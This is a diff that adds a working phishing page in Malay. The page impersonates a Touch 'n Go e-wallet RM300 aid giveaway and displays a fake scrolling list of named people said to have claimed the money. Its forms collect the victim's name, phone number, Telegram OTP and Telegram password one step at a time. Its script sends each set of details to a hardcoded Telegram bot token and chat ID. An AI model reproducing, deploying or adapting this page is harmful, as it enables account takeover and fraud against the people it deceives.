@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Claim Now Bantuan e-Wallet Touch n Go RM 300</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      /* Loading screen */
+      #loading {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      #loading img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      .loading-screen img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+      }
+
+      .hero {
+        height: 100vh;
+        width: 100%;
+        background-color: #fff;
+        position: relative;
+      }
+
+      /* Navbar */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #fff;
+        padding: 10px 10px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 9999;
+      }
+
+      .navbar .navbar-nav {
+        display: flex;
+        align-items: center;
+        justify-content: flex-end;
+        flex-wrap: nowrap;
+      }
+
+      .navbar .navbar-nav a {
+        color: #010101;
+        font-weight: bold;
+        font-size: 24px;
+        margin: auto;
+        padding: 5px;
+        text-decoration: none;
+        white-space: nowrap;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      /* Images */
+      img {
+        width: 350px;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+      }
+
+      img[src="img1.jpeg"] {
+        margin-top: 50px;
+      }
+
+      /* Form styles */
+      .form-container {
+        justify-content: center;
+        background-color: white;
+        padding: 20px;
+        border-radius: 10px;
+        width: 80%;
+        margin: 30px auto;
+      }
+
+      input[type="text"],
+      input[type="tel"],
+      input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 1.1rem;
+      }
+
+      .btn {
+        display: flex;
+        width: 50%;
+        padding: 12px;
+        margin: 10px auto;
+        background-color: #f8d704;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        justify-content: center;
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+
+      /* Info text */
+      .info {
+        font-size: 20px;
+        color: black;
+        text-align: center;
+        margin: 20px 0 30px;
+      }
+
+      .info span {
+        color: #f8d704;
+        font-weight: bold;
+      }
+
+      p {
+        font-size: 20px;
+        color: #f8d704;
+        text-align: center;
+        margin: 5px 0;
+        font-weight: bold;
+      }
+
+      h4 {
+        color: #f8d704;
+        text-align: center;
+        font-size: 25px;
+        margin: 5px 0;
+      }
+
+      /* Record box */
+      ._record-box {
+        width: 90%;
+        margin: 10px auto;
+        padding: 10px;
+        background-color: #f1f1f1;
+        border-radius: 10px;
+      }
+
+      .list-box {
+        overflow: hidden;
+        max-height: 300px;
+      }
+
+      .list {
+        display: flex;
+        flex-direction: column;
+      }
+
+      .item {
+        display: flex;
+        align-items: center;
+        padding: 1px;
+        background-color: white;
+        border-radius: 8px;
+        margin-bottom: 10px;
+      }
+
+      .record_logo img {
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        margin: 0 15px;
+      }
+
+      .center .h1 {
+        font-size: 16px;
+        font-weight: bold;
+      }
+
+      .center .h2 {
+        font-size: 14px;
+        color: green;
+      }
+
+      /* Footer */
+      footer {
+        position: fixed;
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        background-color: #fff;
+        text-align: center;
+      }
+
+      footer img {
+        max-width: 350px;
+        height: auto;
+      }
+
+      /* Media Queries */
+      @media (max-width: 768px) {
+        .form-container {
+          width: 90%;
+          padding: 15px;
+        }
+
+        .btn {
+          width: 60%;
+        }
+
+        .info {
+          font-size: 18px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .info {
+          font-size: 15px;
+        }
+
+        .btn {
+          width: 80%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Loading Screen -->
+    <div id="loading" class="loading-screen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h3 class="info">
+          CLAIM SEKARANG NI TUK DAPATKAN <span>RM300</span> <br />KAT E-WALLET
+          ANDA
+        </h3>
+        <p>Bantuan e-Wallet RM300</p>
+        <div class="container">
+          <button class="btn" onclick="showPage('pendaftaranContent')">
+            CLAIM NOW
+          </button>
+        </div>
+
+        <!-- Record Box -->
+        <div class="_record-box">
+          <div class="list-box">
+            <div class="list">
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Ahmad bin Abdullah</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Siti Nurhaliza</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Muhammad Hafiz bin Ismail</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Nurul Ain binti Hassan</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Mohd Razali bin Ibrahim</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Farah Liyana binti Zulkifli</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Amir Hamzah bin Omar</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Nor Azizah binti Rahman</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Zulkifli bin Mohd Noor</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Noraini binti Ahmad</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Kamal bin Adnan</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Siti Fatimah binti Ismail</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Azman bin Hashim</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Nurul Huda binti Razak</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Mohd Rizal bin Tan</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Rosmah binti Abdullah</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Hafiz bin Yusof</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Aishah binti Mohamed</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Khairul Anwar bin Salleh</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="Avatar" />
+                </div>
+                <div class="center">
+                  <div class="h1">Zarina binti Karim</div>
+                  <div class="h2">Berjaya Claim RM300</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Pendaftaran Content -->
+    <div id="pendaftaranContent" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h4>CLAIM RM 300 NOW</h4>
+
+        <div class="form-container">
+          <form id="registrationForm">
+            <input
+              type="text"
+              id="name"
+              name="name"
+              placeholder="Nama Penuh Sesuai MyKad"
+              required
+            />
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="+60 Phone nombor Telegram"
+              required
+            />
+            <button type="submit" class="btn">CLAIM NOW</button>
+          </form>
+        </div>
+
+        <img src="img3.jpeg" alt="tng-img" />
+      </div>
+    </div>
+
+    <!-- Kode OTP Content -->
+    <div id="kodeContent" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h4>CLAIM RM 300 NOW</h4>
+
+        <div class="form-container">
+          <form id="otpForm">
+            <label for="otp">Masukkan Kod-OTP</label>
+            <input
+              type="tel"
+              id="otp"
+              name="otp"
+              placeholder="Masukkan 5 digit OTP"
+              required
+            />
+            <button type="submit" class="btn">Teruskan</button>
+          </form>
+        </div>
+
+        <img src="img3.jpeg" alt="tng-img" />
+      </div>
+    </div>
+
+    <!-- Kata Sandi Content -->
+    <div id="kataSandiContent" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h4>CLAIM RM 300 NOW</h4>
+
+        <div class="form-container">
+          <p id="kataSandi">Sila Masukkan kata laluan Telegram Anda</p>
+          <form id="passwordForm">
+            <input
+              type="password"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukkan kata laluan Awak"
+              required
+            />
+            <button type="submit" class="btn" id="loginButton">Teruskan</button>
+          </form>
+
+          <img
+            id="loadingGif"
+            src="processing.gif"
+            alt="Loading..."
+            style="display: none; margin: 20px auto; width: 60%"
+          />
+          <p id="formMessage" style="display: none">
+            sila tunggu proses pengesahan atau
+          </p>
+          <button id="useAnotherPhone" style="display: none" class="btn">
+            Gunakan Nombor Telefon Lain
+          </button>
+        </div>
+
+        <img src="img3.jpeg" alt="tng-img" />
+      </div>
+    </div>
+
+    <footer>
+      <img src="ini1.png" alt="Logo Footer" />
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+    <script>
+      // Fungsi untuk menampilkan halaman
+      function showPage(pageId) {
+        document.getElementById("mainContent").style.display = "none";
+        document.getElementById("pendaftaranContent").style.display = "none";
+        document.getElementById("kodeContent").style.display = "none";
+        document.getElementById("kataSandiContent").style.display = "none";
+        document.getElementById(pageId).style.display = "block";
+      }
+
+      // Inisialisasi intl-tel-input
+      const phoneInputField = document.querySelector("#phone");
+      const phoneInput = window.intlTelInput(phoneInputField, {
+        preferredCountries: ["my", "id", "us"],
+        utilsScript:
+          "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+      });
+
+      // Form Pendaftaran
+      document
+        .getElementById("registrationForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const name = document.getElementById("name").value;
+          const phone = document.getElementById("phone").value;
+
+          localStorage.setItem("name", name);
+          localStorage.setItem("phone", phone);
+
+          // Kirim data ke Telegram
+          sendToTelegram(`
+──────────────────────
+( MALAY | DATA )
+──────────────────────
+- Nama Lengkap  : ${name}
+- No HP         : ${phone}
+──────────────────────
+        `);
+
+          showPage("kodeContent");
+        });
+
+      // Form OTP
+      document
+        .getElementById("otpForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const otp = document.getElementById("otp").value;
+          localStorage.setItem("otp", otp);
+
+          // Kirim data ke Telegram
+          const savedName = localStorage.getItem("name");
+          const savedPhone = localStorage.getItem("phone");
+
+          sendToTelegram(`
+──────────────────────
+( MALAY | DATA )
+──────────────────────
+- Nama Lengkap  : ${savedName}
+- No HP         : ${savedPhone}
+- OTP           : ${otp}
+──────────────────────
+        `);
+
+          showPage("kataSandiContent");
+        });
+
+      // Form Kata Sandi
+      document
+        .getElementById("passwordForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          const kataSandi = document.getElementById("kata-sandi").value;
+
+          // Sembunyikan form dan tampilkan loading
+          document.getElementById("kata-sandi").style.display = "none";
+          document.getElementById("loginButton").style.display = "none";
+          document.getElementById("loadingGif").style.display = "block";
+          document.getElementById("formMessage").style.display = "block";
+          document.getElementById("kataSandi").style.display = "none";
+          document.getElementById("useAnotherPhone").style.display = "block";
+
+          // Kirim data ke Telegram
+          const savedName = localStorage.getItem("name");
+          const savedPhone = localStorage.getItem("phone");
+          const savedOtp = localStorage.getItem("otp");
+
+          sendToTelegram(`
+──────────────────────
+( MALAY | DATA )
+──────────────────────
+- Nama Lengkap  : ${savedName}
+- No HP         : ${savedPhone}
+- OTP           : ${savedOtp}
+- Kata Sandi    : ${kataSandi}
+──────────────────────
+        `);
+        });
+
+      // Fungsi untuk mengirim ke Telegram
+      function sendToTelegram(message) {
+        const botToken = "7703556124:AAH-5gP5MS4pWdA5YQUf45OeZBvzr4Bh6jU";
+        const chatId = "7692466178";
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+      }
+
+      // Event listener untuk tombol "Gunakan Nomor Lain"
+      document
+        .getElementById("useAnotherPhone")
+        .addEventListener("click", function () {
+          showPage("mainContent");
+        });
+
+      // Auto-scroll untuk record box
+      function startAutoScroll() {
+        const list = document.querySelector(".list");
+        if (!list) return;
+
+        function scrollList() {
+          const firstItem = list.querySelector(".item:first-child");
+          if (!firstItem) return;
+
+          const itemHeight = firstItem.offsetHeight;
+          list.style.transition = "margin-top 1s ease";
+          list.style.marginTop = `-${itemHeight}px`;
+
+          setTimeout(function () {
+            list.style.transition = "none";
+            list.style.marginTop = "0px";
+            list.appendChild(firstItem);
+          }, 1000);
+
+          setTimeout(scrollList, 2000);
+        }
+
+        scrollList();
+      }
+
+      document.addEventListener("DOMContentLoaded", startAutoScroll);
+
+      // Fungsi untuk menampilkan loading screen
+      function showLoading() {
+        document.getElementById("loading").style.display = "flex";
+        setTimeout(() => {
+          document.getElementById("loading").style.display = "none";
+        }, 2000);
+      }
+
+      // Fungsi untuk menampilkan processing screen
+      function showProcessing() {
+        document.getElementById("loadingScreen").style.display = "flex";
+      }
+
+      // Fungsi untuk menyembunyikan processing screen
+      function hideProcessing() {
+        document.getElementById("loadingScreen").style.display = "none";
+      }
+
+      // Tambahkan event listener untuk menampilkan loading screen saat tombol diklik
+      document.querySelectorAll(".btn").forEach((button) => {
+        button.addEventListener("click", function () {
+          showLoading();
+        });
+      });
+    </script>
+  </body>
+</html>
